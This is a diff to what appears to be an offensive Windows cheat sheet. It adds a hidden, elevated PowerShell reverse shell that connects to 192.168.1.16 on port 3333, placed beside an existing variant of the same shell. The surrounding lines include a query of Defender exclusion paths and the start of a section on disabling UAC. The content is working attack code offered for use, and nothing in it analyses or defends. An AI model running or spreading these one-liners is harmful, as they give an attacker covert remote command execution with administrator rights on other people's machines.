@@ -162,6 +162,7 @@ powershell -c "Get-MpPreference | Select-Object -ExpandProperty ExclusionPath"
 ---------------------------------------------------------------------------------------------------------------
 Admin Shell via User Interaction 
 Start-Process "cmd.exe" -ArgumentList "/c powershell -windowstyle hidden -c `"`$C=new-object net.sockets.tcpclient('192.168.1.16',3333);`$S=`$C.GetStream();[byte[]]`$B=0..65535|%{0};while((`$I=`$S.Read(`$B,0,`$B.Length)) -ne 0){;`$D=(new-object -typename System.Text.ASCIIEncoding).GetString(`$B,0,`$I);`$O=(iex `$D 2>&1 | Out-String);`$OB=`$O+'PS '+(pwd).Path+'> ';`$SB=([text.encoding]::ASCII).GetBytes(`$OB);`$S.Write(`$SB,0,`$SB.Length);`$S.Flush()};`$C.Close()`"" -Verb RunAs -WindowStyle Hidden
+Start-Process PowerShell  -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command "$h=''192.168.1.16'';$p=3333;$C=New-Object Net.Sockets.TcpClient($h,$p);$S=$C.GetStream();[byte[]]$B=0..65535|%{0};while(($I=$S.Read($B,0,$B.Length)) -ne 0){$D=([Text.Encoding]::ASCII).GetString($B,0,$I);$O=(iex $D 2>&1|Out-String);$OB=$O+''PS ''+(Get-Location).Path+''> ''; $SB=[Text.Encoding]::ASCII.GetBytes($OB);$S.Write($SB,0,$SB.Length);$S.Flush()};$C.Close()"'  -Verb RunAs  -WindowStyle Hidden
 ---------------------------------------------------------------------------------------------------------------
 With Administrator Privs 
 To disable UAC :
